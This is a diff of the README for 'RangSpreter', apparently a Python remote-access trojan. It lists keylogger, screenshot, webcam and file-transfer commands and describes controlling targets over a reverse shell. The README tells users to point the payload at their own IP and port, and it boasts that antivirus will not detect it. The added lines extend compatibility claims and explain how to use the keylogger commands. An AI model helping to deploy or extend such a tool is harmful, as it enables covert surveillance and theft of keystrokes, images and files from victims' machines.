@@ -3,10 +3,13 @@
 This is RangSpreter. The payloads that contains keylogger, screenshot and even webcam. This payload can control other target with reverse shell. 
 You need to change the IP Address to your computer IP and change port whatever you want (examples: 5555, 9999). The best thing about this payload is that it will NOT be detected by antivirus, except if you changes it to exe file, may be detected by some antiviruses.
 
-
 - compatible with python3
+- compatible with windows 10
+- compatibles to control linux system
+- this payloads should be safe because will not survive in the system
 
 Authors: [RangS](mailto:rangga19sj@gmail.com)
+Inspirations: [Python Project ID](https://www.youtube.com/@pythonproject940)
 
 -------------
 
@@ -53,9 +56,9 @@ Options after get in:
   ul                    upload file to target
   dl                    download file from target
   exit, out             get out from target
-  sl                    start keylogger
-  rl                    read keylogger
-  stl                   stop keylogger
+  sl                    start keylogger (when you are start keylogger, you can't use any of those commands)
+  rl                    read keylogger (don't use this command if you don't start keylogger/sl)
+  stl                   stop keylogger (don't use this command if you don't start keylogger/sl)
   wcam                  start web camera (use escape button to stop webcam)
   sh                    screenshot target monitor
 
